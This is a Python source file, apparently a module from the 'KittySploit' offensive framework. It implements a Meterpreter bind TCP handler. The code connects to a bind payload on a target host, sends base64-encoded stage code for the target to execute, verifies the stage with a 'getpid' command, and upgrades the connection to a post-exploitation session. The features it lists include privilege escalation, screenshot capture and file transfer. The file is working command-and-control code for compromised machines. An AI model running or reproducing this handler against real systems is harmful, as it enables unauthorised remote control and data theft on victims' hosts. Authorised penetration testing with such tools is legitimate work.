#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
import socket
import threading
import time
import struct

class Module(Listener):
    """Meterpreter bind TCP handler — connects to a bind payload on the target"""

    __info__ = {
        'name': 'Meterpreter Bind TCP',
        'description': 'Meterpreter bind TCP handler with post-exploitation capabilities',
        'author': 'KittySploit Team',
        'version': '1.0.0',
        'handler': Handler.BIND,
        'session_type': SessionType.METERPRETER,
        'references': [
            'https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/'
        ]
    }

    rhost = OptString("127.0.0.1", "Target IPv4 or IPv6 address", True)
    rport = OptPort(4444, "Target bind TCP port", True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self.sock = None
        self.running = False
        self.listener_thread = None
        self.job_id = None
        self.created_session_id = None  # Store the created session ID
        self.session_created_event = threading.Event()  # Event to signal session creation
        
        # Initialize handler from __info__ if available
        if hasattr(self, '__info__') and 'handler' in self.__info__:
            handler_info = self.__info__['handler']
            if hasattr(handler_info, 'value'):
                handler_value = handler_info.value
            elif hasattr(handler_info, 'name'):
                handler_value = handler_info.name.lower()
            else:
                handler_value = str(handler_info).lower()
            # Set the handler option value
            self.handler = handler_value
        # Initialize session_type from __info__ if available
        if hasattr(self, '__info__') and 'session_type' in self.__info__:
            session_type_info = self.__info__['session_type']
            if hasattr(session_type_info, 'value'):
                session_type_value = session_type_info.value
            elif hasattr(session_type_info, 'name'):
                session_type_value = session_type_info.name.lower()
            else:
                session_type_value = str(session_type_info).lower()
            # Set the session_type option value
            self.session_type = session_type_value
    
    def run(self, background=False):
        """Connect to a Meterpreter bind TCP payload on the target"""
        try:
            rhost = str(self.rhost) if self.rhost else "127.0.0.1"
            rport = int(self.rport) if self.rport else 4444

            print_info(f"Starting {self.name}...")
            print_status(f"Trying to connect to {rhost}:{rport}")
            print_warning("Ensure the bind payload is running on the target...")

            if background:
                self.running = True
                self.listener_thread = threading.Thread(
                    target=self._connect_to_target, args=(rhost, rport)
                )
                self.listener_thread.daemon = True
                self.listener_thread.start()
                return True

            self.running = True
            self._connect_to_target(rhost, rport)

            if self.created_session_id:
                print_info("Session created.")
                return self.created_session_id
            return self.created_session_id if self.created_session_id else True

        except KeyboardInterrupt:
            print_info("\n[!] Interrupted by user")
            self.running = False
            return False
        except Exception as e:
            print_error(f"Error starting handler: {e}")
            return False
        finally:
            if not background:
                self.shutdown()

    def _connect_to_target(self, rhost, rport):
        """Connect to the target bind payload and establish a Meterpreter session"""
        client_socket = None
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client_socket.settimeout(30.0)
            client_socket.connect((rhost, rport))
            client_socket.settimeout(None)
            self.sock = client_socket

            print_success(f"Connected to {rhost}:{rport}")
            self._handle_connection(client_socket, (rhost, rport))
        except ConnectionRefusedError:
            print_error(f"Connection refused by {rhost}:{rport}")
            self.session_created_event.set()
        except OSError as e:
            print_error(f"Connection error: {e}")
            self.session_created_event.set()
        except Exception as e:
            if self.running:
                print_error(f"Error connecting to target: {e}")
            self.session_created_event.set()
        finally:
            self.running = False
    
    def _handle_connection(self, client_socket, address):
        """Handle incoming connection"""
        try:
            # First, send the Meterpreter stage code to the stager
            # The stager will receive this, execute it, and then continue with JSON protocol
            try:
                # Get the stage code from the payload module
                stage_language = self._detect_stage_language(client_socket)
                stage_code = self._get_meterpreter_stage_code(stage_language)
                if stage_code:
                    # Encode stage code as base64
                    import base64
                    stage_bytes = base64.b64encode(stage_code.encode('utf-8'))
                    
                    # Send length (4 bytes big-endian) then stage code
                    length = struct.pack('>I', len(stage_bytes))
                    client_socket.sendall(length + stage_bytes)
                    print_debug(f"Sent {stage_language} Meterpreter stage code ({len(stage_bytes)} bytes) to stager")
                else:
                    print_debug("Could not get stage code, stager may fail")
                    # Try to continue anyway - maybe it's a direct connection
            except Exception as e:
                print_debug(f"Error sending stage code: {e}")
                import traceback
                traceback.print_exc()
                # Continue anyway - maybe it's not a stager connection
            
            # Wait for the stage to load and initialize
            # Give it more time - stage execution can take a moment
            time.sleep(2.0)  # Increased wait time for stage initialization
            
            # Verify that the payload is working by sending a test command
            # Retry verification up to 3 times with increasing delays
            payload_valid = False
            for attempt in range(3):
                if attempt > 0:
                    time.sleep(1.0)  # Wait a bit longer between retries
                payload_valid = self._verify_payload(client_socket)
                if payload_valid:
                    break
                if attempt < 2:  # Don't print error on last attempt
                    print_debug(f"Payload verification attempt {attempt + 1} failed, retrying...")
            
            if not payload_valid:
                print_error("Payload verification failed - stage may have failed to execute")
                print_error("Possible causes:")
                print_error("  - Stage code execution error (check stager output)")
                print_error("  - Network connectivity issues")
                print_error("  - Socket closed prematurely")
                try:
                    client_socket.close()
                except:
                    pass
                # Signal failure so listener can exit
                self.session_created_event.set()
                return
            
            # Don't send banner text - client expects JSON commands immediately
            # Create Meterpreter session only if payload is verified
            session_id = self.create_session_from_connection(
                client_socket,
                address,
                {
                    'handler_type': Handler.BIND.value,
                    'session_type': SessionType.METERPRETER.value,
                    'meterpreter_version': '1.0.0'
                }
            )
            
            if session_id:
                print_success(f"Meterpreter session {session_id} opened!")
                print_status(f"Session ID: {session_id}")
                print_status(f"Target: {address[0]}:{address[1]}")
                
                # Verify socket is stored
                if hasattr(self, '_session_connections') and session_id in self._session_connections:
                    print_debug(f"Socket stored in _session_connections for session {session_id}")
                else:
                    print_debug(f"Socket NOT found in _session_connections for session {session_id}")
                
                # Store session_id and signal that session was created
                self.created_session_id = session_id
                self.session_created_event.set()
                
                # Give the client a moment to start its main loop
                # The Python client needs time to enter its run() loop
                time.sleep(0.5)  # Reduced since we already verified it's working
                
                # Upgrade shell to meterpreter if framework is available
                if self.framework and hasattr(self.framework, 'shell_manager'):
                    self._upgrade_to_meterpreter(session_id)
            else:
                print_error("Failed to create Meterpreter session")
                client_socket.close()
                # Signal failure so listener can exit
                self.session_created_event.set()
                
        except Exception as e:
            print_error(f"Error handling connection: {e}")
            try:
                client_socket.close()
            except:
                pass
    
    def _verify_payload(self, client_socket):
        """Verify that the payload is working by sending a test command"""
        try:
            import json
            import struct
            
            # Set a reasonable timeout for the verification
            original_timeout = client_socket.gettimeout()
            client_socket.settimeout(10.0)  # 10 second timeout for verification
            
            # Send a simple test command (getpid)
            cmd_data = {
                'command': 'getpid',
                'args': []
            }
            cmd_json = json.dumps(cmd_data)
            cmd_bytes = cmd_json.encode('utf-8')
            
            # Send length (4 bytes big-endian) then data
            try:
                length = struct.pack('>I', len(cmd_bytes))
                client_socket.sendall(length + cmd_bytes)
            except (socket.error, OSError) as e:
                error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
                print_debug(f"Payload verification: failed to send command (error {error_code}): {e}")
                client_socket.settimeout(original_timeout)
                return False
            
            # Wait for response
            # Receive length (4 bytes)
            length_data = b''
            start_time = time.time()
            while len(length_data) < 4:
                try:
                    chunk = client_socket.recv(4 - len(length_data))
                    if not chunk:
                        print_debug("Payload verification: connection closed while receiving length")
                        client_socket.settimeout(original_timeout)
                        return False
                    length_data += chunk
                except socket.timeout:
                    elapsed = time.time() - start_time
                    if elapsed > 10.0:
                        print_debug("Payload verification: timeout waiting for response length")
                        client_socket.settimeout(original_timeout)
                        return False
                    continue
                except (socket.error, OSError) as e:
                    error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
                    print_debug(f"Payload verification: socket error receiving length (error {error_code}): {e}")
                    client_socket.settimeout(original_timeout)
                    return False
            
            response_length = struct.unpack('>I', length_data)[0]
            
            # Validate response length
            if response_length > 10 * 1024 * 1024:  # 10MB max
                print_debug(f"Payload verification: response length too large: {response_length}")
                client_socket.settimeout(original_timeout)
                return False
            
            # Receive response data
            response_data = b''
            while len(response_data) < response_length:
                try:
                    chunk = client_socket.recv(min(65536, response_length - len(response_data)))
                    if not chunk:
                        print_debug(f"Payload verification: connection closed while receiving response (got {len(response_data)}/{response_length})")
                        client_socket.settimeout(original_timeout)
                        return False
                    response_data += chunk
                except socket.timeout:
                    elapsed = time.time() - start_time
                    if elapsed > 10.0:
                        print_debug(f"Payload verification: timeout receiving response (got {len(response_data)}/{response_length})")
                        client_socket.settimeout(original_timeout)
                        return False
                    continue
                except (socket.error, OSError) as e:
                    error_code = getattr(e, 'winerror', getattr(e, 'errno', None))
                    print_debug(f"Payload verification: socket error receiving response (error {error_code}): {e}")
                    client_socket.settimeout(original_timeout)
                    return False
            
            # Parse response
            try:
                response = json.loads(response_data.decode('utf-8'))
                # Check if we got a valid response (status 0 means success)
                if response.get('status') == 0:
                    print_debug("Payload verification: SUCCESS")
                    # Restore original timeout
                    client_socket.settimeout(original_timeout)
                    return True
                else:
                    error_msg = response.get('error', 'Unknown error')
                    print_debug(f"Payload verification: got error status {response.get('status')}: {error_msg}")
                    client_socket.settimeout(original_timeout)
                    return False
            except json.JSONDecodeError as e:
                print_debug(f"Payload verification: invalid JSON response: {e}")
                print_debug(f"Response data (first 200 chars): {response_data[:200]}")
                client_socket.settimeout(original_timeout)
                return False
                
        except Exception as e:
            print_debug(f"Payload verification failed: {e}")
            import traceback
            traceback.print_exc()
            try:
                client_socket.settimeout(original_timeout)
            except:
                pass
            return False
    
    def _detect_stage_language(self, client_socket):
        """Detect optional stager language preface. Defaults to Python for older stagers."""
        try:
            original_timeout = client_socket.gettimeout()
            client_socket.settimeout(0.25)
            try:
                data = client_socket.recv(6, socket.MSG_PEEK)
            except socket.timeout:
                return 'python'
            finally:
                client_socket.settimeout(original_timeout)

            if data == b'KSPHP1':
                client_socket.recv(6)
                return 'php'
        except Exception:
            pass
        return 'python'

    def _get_meterpreter_stage_code(self, stage_language='python'):
        """Get the Meterpreter stage code from the payload module"""
        try:
            # Try to get the payload module from framework
            if self.framework and hasattr(self.framework, 'module_loader'):
                if stage_language == 'php':
                    payload_paths = [
                        'payloads/singles/cmd/php/meterpreter_bind_tcp'
                    ]
                else:
                    payload_paths = [
                        'payloads/singles/cmd/windows/python_meterpreter_bind_tcp',
                        'payloads/singles/cmd/unix/python_meterpreter_bind_tcp'
                    ]

                for payload_path in payload_paths:
                    try:
                        payload_module = self.framework.module_loader.load_module(payload_path, framework=self.framework)

                        if payload_module:
                            if hasattr(payload_module, 'rhost'):
                                payload_module.set_option('rhost', self.rhost)
                            if hasattr(payload_module, 'rport'):
                                payload_module.set_option('rport', self.rport)
                            
                            if hasattr(payload_module, 'get_stage_code'):
                                stage_code = payload_module.get_stage_code()
                                if stage_code:
                                    return stage_code
                            elif hasattr(payload_module, 'meterpreter_stage_code'):
                                return payload_module.meterpreter_stage_code
                            elif hasattr(payload_module, 'generate'):
                                # Generate to populate meterpreter_stage_code
                                payload_module.generate()
                                if hasattr(payload_module, 'meterpreter_stage_code'):
                                    return payload_module.meterpreter_stage_code
                    except Exception as e:
                        # Try next path
                        continue
        except Exception as e:
            print_warning(f"Could not get stage code from payload module: {e}")
            import traceback
            traceback.print_exc()
        
        # Fallback: return None (stager will handle it)
        return None
    
    def shutdown(self):
        """Shutdown the listener"""
        print_info("Shutting down listener...")
        self.running = False
        
        # Update job status if running as background job
        if self.job_id:
            try:
                from core.job_manager import global_job_manager
                global_job_manager.update_job_status(self.job_id, 'completed', "Listener stopped")
            except Exception as e:
                print_warning(f"Could not update job status: {e}")
        
        # Close the socket to stop accepting new connections
        try:
            if self.sock:
                self.sock.close()
                print_success("Listener stopped gracefully")
        except OSError as e:
            print_warning(f"Error during shutdown: {e}")
        except Exception as e:
            print_warning(f"Unexpected error during shutdown: {e}")
        
        # Wait for listener thread to finish
        if self.listener_thread and self.listener_thread.is_alive():
            self.listener_thread.join(timeout=2)
            if self.listener_thread.is_alive():
                print_warning("Listener thread did not stop gracefully")
    
    def _get_meterpreter_banner(self) -> str:
        """Get Meterpreter banner"""
        banner = """
[*] Meterpreter session opened!
[*] Starting post-exploitation phase...
[*] Type 'help' for available commands

"""
        return banner
    
    def _upgrade_to_meterpreter(self, session_id: str):
        """Upgrade existing shell session to Meterpreter"""
        try:
            print_info(f"Upgrading session {session_id} to Meterpreter...")
            
            # Check if shell manager exists
            if not hasattr(self.framework, 'shell_manager'):
                print_warning("Shell manager not available, skipping upgrade")
                return False
            
            shell_manager = self.framework.shell_manager
            
            # Check if shell already exists
            existing_shell = shell_manager.get_shell(session_id)
            
            if existing_shell:
                print_info(f"Existing shell found: {existing_shell.shell_name}")
                
                # If it's already meterpreter, we're done
                if existing_shell.shell_name == "meterpreter":
                    print_success("Session is already a Meterpreter session")
                    return True
                
                # Get shell state to preserve
                shell_state = {
                    'username': existing_shell.username,
                    'hostname': existing_shell.hostname,
                    'is_root': existing_shell.is_root,
                    'current_directory': existing_shell.current_directory,
                    'environment_vars': existing_shell.environment_vars.copy(),
                    'command_history': existing_shell.command_history.copy()
                }
                
                # Remove old shell
                shell_manager.remove_shell(session_id)
                
                # Create new Meterpreter shell
                from core.framework.shell.meterpreter_shell import MeterpreterShell
                
                meterpreter_shell = MeterpreterShell(session_id, SessionType.METERPRETER.value, self.framework)
                
                # Restore state
                meterpreter_shell.username = shell_state['username']
                meterpreter_shell.hostname = shell_state['hostname']
                meterpreter_shell.is_root = shell_state['is_root']
                meterpreter_shell.current_directory = shell_state['current_directory']
                meterpreter_shell.environment_vars = shell_state['environment_vars']
                meterpreter_shell.command_history = shell_state['command_history']
                
                # Register the new shell
                shell_manager.shells[session_id] = meterpreter_shell
                shell_manager.switch_shell(session_id)
                
                print_success(f"Successfully upgraded session {session_id} to Meterpreter!")
                return True
            else:
                # No existing shell, create new Meterpreter shell
                from core.framework.shell.meterpreter_shell import MeterpreterShell
                
                meterpreter_shell = MeterpreterShell(session_id, SessionType.METERPRETER.value, self.framework)
                shell_manager.shells[session_id] = meterpreter_shell
                shell_manager.switch_shell(session_id)
                
                print_success(f"Created new Meterpreter shell for session {session_id}")
                return True
                
        except Exception as e:
            print_error(f"Error upgrading to Meterpreter: {e}")
            return False
    
    def upgrade_session(self, session_id: str) -> bool:
        """
        Public method to upgrade a session to Meterpreter
        Can be called from other modules or commands
        
        Args:
            session_id: The session ID to upgrade
            
        Returns:
            bool: True if upgrade successful, False otherwise
        """
        if not self.framework or not hasattr(self.framework, 'shell_manager'):
            print_error("Framework or shell manager not available")
            return False
        
        return self._upgrade_to_meterpreter(session_id)
    
    def get_handler_info(self):
        """Get handler information"""
        info = {
            'handler': Handler.BIND.value,
            'handler_enum': Handler.BIND,
            'session_type': SessionType.METERPRETER.value,
            'session_enum': SessionType.METERPRETER,
            'meterpreter_version': '1.0.0',
            'features': [
                'System information gathering',
                'File operations (upload/download)',
                'Process management',
                'Network operations',
                'Privilege escalation',
                'Screenshot capture',
                'And more...'
            ]
        }
        
        return info
